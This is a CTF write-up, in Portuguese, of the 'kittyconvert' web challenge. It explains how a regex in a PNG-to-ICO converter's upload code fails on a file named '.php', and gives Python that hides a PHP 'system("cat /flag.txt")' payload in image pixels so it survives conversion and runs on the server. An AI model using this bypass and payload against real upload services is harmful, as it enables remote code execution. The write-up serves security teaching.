# kittyconvert

*Need to convert a file? Our kittens have got you covered!*

- *Web Exploitation*
- *Autor do writeup: [@rebane2001](https://github.com/rebane2001)*

> Você pode acessar os arquivos do desafio no nosso repositório
> <https://github.com/HawkSecUnifei/Writeups>

O desafio disponibiliza um website chamado KittyConvert que permite os usuários converter arquivos PNG para arquivos ICO. Ele também fornece o código-fonte do servidor que carrega o site. O objetivo do desafio é acessar a flag dentro do arquivo `flag.txt` localizado no diretório root do servidor.

## Parte I - Passando pela checagem de extensão
Ao analisar o código-fonte, notamos o trecho de código no arquivo `index.php`: 
``` php
if (isset($_FILES['file'])) {
  $base_dir = "/var/www/html/";
  $ico_file = "uploads/" . preg_replace("/^(.+)\\..+$/", "$1.ico", basename($_FILES["file"]["name"]));
  
  if ($_FILES["file"]["size"] > 8000) {
    echo "<p>Sorry, your file is too large you need to buy Nitro.</p>";
  } else {
    require( dirname( __FILE__ ) . '/class-php-ico.php' );
    $ico_lib = new PHP_ICO( $_FILES["file"]["tmp_name"], array( array( 32, 32 ), array( 64, 64 ) ) );
    $ico_lib->save_ico( $base_dir . $ico_file );
    $success = true;
  }
}
```
A função `preg_replace` nesse código está checando se os arquivos sendo enviados tem alguma extensão. Caso eles tenham, a string `'ico'` é colocada no final do nome do arquivo. Isto apaga a possibilidade de mandar um arquivo `exploit.php` com algum código malicioso e então executá-lo ao requerir o path `/uploads/exploit.php`. No entanto, existe uma alternativa: se o arquivo enviado se chamar apenas `.php`, o código `preg_replace("/^(.+)\\..+$/", "$1.ico", basename($_FILES["file"]["name"]))` não adicionará a extensão `.ico`. Isso ocorre porque a expressão regular exige que haja pelo menos um caractere antes do primeiro ponto (.), o que não é o caso de `.php`.

## Parte II - Construindo o payload
Nós já temos uma parte do problema pronta: como executar código dentro do servidor. Mas nos deparamos com um obstáculo: o conteúdo do arquivo que enviamos é alterado pela classe `PHP_ICO`. Nosso desafio será criar um arquivo PNG que quando sofre as alterações descritas em `class-php-ico.php` gere um código php interessante.
``` python
from PIL import Image

im = Image.new("RGBA", (64,64), "white")
pixels = im.load()
payload = b'<?php    echo   system( "cat /flag.txt" );  ?>  '

for index, el in enumerate(zip(*[iter(payload)]*4)):
    if el[3] % 2 == 1: 
        print(f"Invalid alpha character")
    pixels[(index%64, index//64)] = (el[2],el[1],el[0],el[3])

im.save("exploit.png", "PNG")
```

Já conseguimos explorar uma vulnerabilidade que permite a execução de código dentro do servidor. Entretanto, enfrentamos um novo obstáculo: o conteúdo do arquivo enviado é modificado pela classe `PHP_ICO`.  

Nosso desafio agora é criar um arquivo PNG que, ao sofrer essas alterações pela classe `class-php-ico.php`, gere um código PHP funcional. Para isso, vamos codificar um payload dentro dos pixels da imagem, garantindo que, mesmo após a conversão, ele possa ser interpretado como código PHP executável.  

O código python a seguir cria um arquivo PNG legítimo com tamanho 64 por 64 e preenchido todo com pixels em branco. Em seguida, ele injeta os bytes da variável `payload` nos bytes da imagem. Vale ressaltar que, no formato PNG, as cores seguem o formato RGBA, enquanto que, no formato ICO, as cores seguem o formato BGRA. Por isso a linha de código `(el[2],el[1],el[0],el[3])` invés de `(el[0],el[1],el[2],el[3])`. Além disso, o código também corta o bit menos significativo do campo alpha, nos forçando a deixar somente bytes com o LSB (less significant bit) igual a zero como o valor de alpha. Por essa razão, o payload está formatado dessa maneira.  

Por fim, utilizando esse código para criar um arquivo PNG apropriado e o enviando de acordo o procedimento descrito na parte I, obteremos a flag:
```
x3c{b1tm4p5_4r3_s1mpl3_6u7_7h3_4lph4_1s_w31rd}
```
